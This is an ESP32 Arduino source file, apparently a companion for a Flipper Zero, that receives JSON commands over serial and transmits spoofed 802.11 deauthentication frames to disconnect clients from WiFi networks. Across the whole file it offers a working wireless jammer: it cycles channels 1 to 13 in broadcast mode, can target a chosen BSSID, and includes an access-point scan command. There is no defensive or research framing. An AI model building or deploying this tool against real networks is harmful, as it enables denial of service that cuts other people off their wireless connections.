/*
 * deauth.ino — ESP32 WiFi Deauth Slave
 *
 * Receives JSON commands via UART (115200 baud) from the Flipper Zero
 * and sends 802.11 deauthentication frames using the raw 80211 TX API.
 *
 * Commands:
 *   {"cmd":"deauth","ch":<1-13>,"bcast":<true/false>,"bssid":"XX:XX:XX:XX:XX:XX","dur":<ms>}
 *   {"cmd":"stop"}
 *
 * Responses:
 *   {"ok":true}
 *   {"ok":false,"err":"<message>"}
 *
 * Board: ESP32 Dev Module
 * Requires: Arduino ESP32 core >= 2.0
 *            esp_wifi (built-in)
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/*  802.11 Deauth frame template                                        */
/* ------------------------------------------------------------------ */

/* Broadcast deauth frame: subtype 0x0C, reason 0x0007 (class 3 frame) */
static uint8_t deauth_frame[26] = {
    /* Frame Control */
    0xC0, 0x00,
    /* Duration */
    0x00, 0x00,
    /* Destination: ff:ff:ff:ff:ff:ff (broadcast) */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    /* Source BSSID: filled at runtime */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* BSSID: filled at runtime */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    /* Sequence control */
    0x00, 0x00,
    /* Reason: Class 3 frame received from nonassociated STA */
    0x07, 0x00,
};

/* ------------------------------------------------------------------ */
/*  State                                                               */
/* ------------------------------------------------------------------ */

static bool      jam_running    = false;
static uint8_t   jam_channel    = 6;
static uint8_t   jam_bssid[6]   = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static bool      jam_broadcast  = true;
static uint32_t  jam_dur_ms     = 0;
static uint32_t  jam_start_ms   = 0;

/* ------------------------------------------------------------------ */
/*  Tiny JSON parser (no library dependency)                            */
/* ------------------------------------------------------------------ */

static bool json_get_string(const char* json, const char* key, char* out, size_t out_len) {
    char search[32];
    snprintf(search, sizeof(search), "\"%s\":\"", key);
    const char* p = strstr(json, search);
    if(!p) return false;
    p += strlen(search);
    const char* end = strchr(p, '"');
    if(!end) return false;
    size_t len = (size_t)(end - p);
    if(len >= out_len) len = out_len - 1;
    memcpy(out, p, len);
    out[len] = '\0';
    return true;
}

static bool json_get_int(const char* json, const char* key, long* out) {
    char search[32];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char* p = strstr(json, search);
    if(!p) return false;
    p += strlen(search);
    *out = strtol(p, NULL, 10);
    return true;
}

static bool json_get_bool(const char* json, const char* key, bool* out) {
    char search[32];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char* p = strstr(json, search);
    if(!p) return false;
    p += strlen(search);
    while(*p == ' ') p++;
    if(strncmp(p, "true",  4) == 0) { *out = true;  return true; }
    if(strncmp(p, "false", 5) == 0) { *out = false; return true; }
    return false;
}

static bool parse_mac(const char* str, uint8_t* mac) {
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

/* ------------------------------------------------------------------ */
/*  Deauth helpers                                                      */
/* ------------------------------------------------------------------ */

static void send_deauth_to(const uint8_t* dst, const uint8_t* bssid) {
    memcpy(deauth_frame + 4,  dst,   6); /* DA */
    memcpy(deauth_frame + 10, bssid, 6); /* SA */
    memcpy(deauth_frame + 16, bssid, 6); /* BSSID */
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
}

static void scan_and_deauth(uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    if(jam_broadcast) {
        static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        /* Send from a spoofed source — we use the broadcast address as SA too */
        send_deauth_to(bcast, jam_bssid[0] == 0xFF ? bcast : jam_bssid);
    } else {
        static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        send_deauth_to(bcast, jam_bssid);
    }
}

/* ------------------------------------------------------------------ */
/*  Setup / loop                                                        */
/* ------------------------------------------------------------------ */

void setup() {
    Serial.begin(115200);
    Serial.setTimeout(100);

    /* Start WiFi in station mode — needed for esp_wifi_80211_tx */
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();

    /* Enable raw 802.11 TX */
    esp_wifi_set_promiscuous(true);

    Serial.println("{\"ready\":true}");
}

static char line_buf[256];
static size_t line_pos = 0;

void loop() {
    /* Read incoming UART data byte by byte */
    while(Serial.available()) {
        char c = (char)Serial.read();
        if(c == '\n' || c == '\r') {
            if(line_pos > 0) {
                line_buf[line_pos] = '\0';
                handle_command(line_buf);
                line_pos = 0;
            }
        } else if(line_pos < sizeof(line_buf) - 1) {
            line_buf[line_pos++] = c;
        }
    }

    /* Execute jamming if active */
    if(jam_running) {
        if(jam_dur_ms > 0 && (millis() - jam_start_ms) >= jam_dur_ms) {
            jam_running = false;
            Serial.println("{\"stopped\":true}");
            return;
        }

        if(jam_broadcast || jam_channel == 0) {
            /* Cycle all channels 1-13 */
            for(uint8_t ch = 1; ch <= 13; ch++) {
                scan_and_deauth(ch);
                delay(1);
            }
        } else {
            scan_and_deauth(jam_channel);
            delay(2);
        }
    }
}

/* ------------------------------------------------------------------ */
/*  Command handler                                                     */
/* ------------------------------------------------------------------ */

void handle_command(const char* json) {
    char cmd[16] = {0};
    json_get_string(json, "cmd", cmd, sizeof(cmd));

    if(strcmp(cmd, "deauth") == 0) {
        long ch  = 6;
        long dur = 30000;
        char bssid_str[20] = "FF:FF:FF:FF:FF:FF";
        bool bcast = true;

        json_get_int(json,  "ch",    &ch);
        json_get_int(json,  "dur",   &dur);
        json_get_bool(json, "bcast", &bcast);
        json_get_string(json, "bssid", bssid_str, sizeof(bssid_str));

        jam_channel   = (uint8_t)ch;
        jam_dur_ms    = (uint32_t)dur;
        jam_broadcast = bcast;
        parse_mac(bssid_str, jam_bssid);

        jam_start_ms = millis();
        jam_running  = true;

        Serial.println("{\"ok\":true}");

    } else if(strcmp(cmd, "stop") == 0) {
        jam_running = false;
        Serial.println("{\"ok\":true}");

    } else if(strcmp(cmd, "scan") == 0) {
        /* Quick scan and return found APs */
        int n = WiFi.scanNetworks();
        Serial.print("{\"ok\":true,\"aps\":[");
        for(int i = 0; i < n; i++) {
            if(i > 0) Serial.print(",");
            Serial.print("{\"ssid\":\"");
            Serial.print(WiFi.SSID(i));
            Serial.print("\",\"ch\":");
            Serial.print(WiFi.channel(i));
            Serial.print(",\"rssi\":");
            Serial.print(WiFi.RSSI(i));
            Serial.print(",\"bssid\":\"");
            Serial.print(WiFi.BSSIDstr(i));
            Serial.print("\"}");
        }
        Serial.println("]}");

    } else {
        Serial.print("{\"ok\":false,\"err\":\"unknown cmd: ");
        Serial.print(cmd);
        Serial.println("\"}");
    }
}
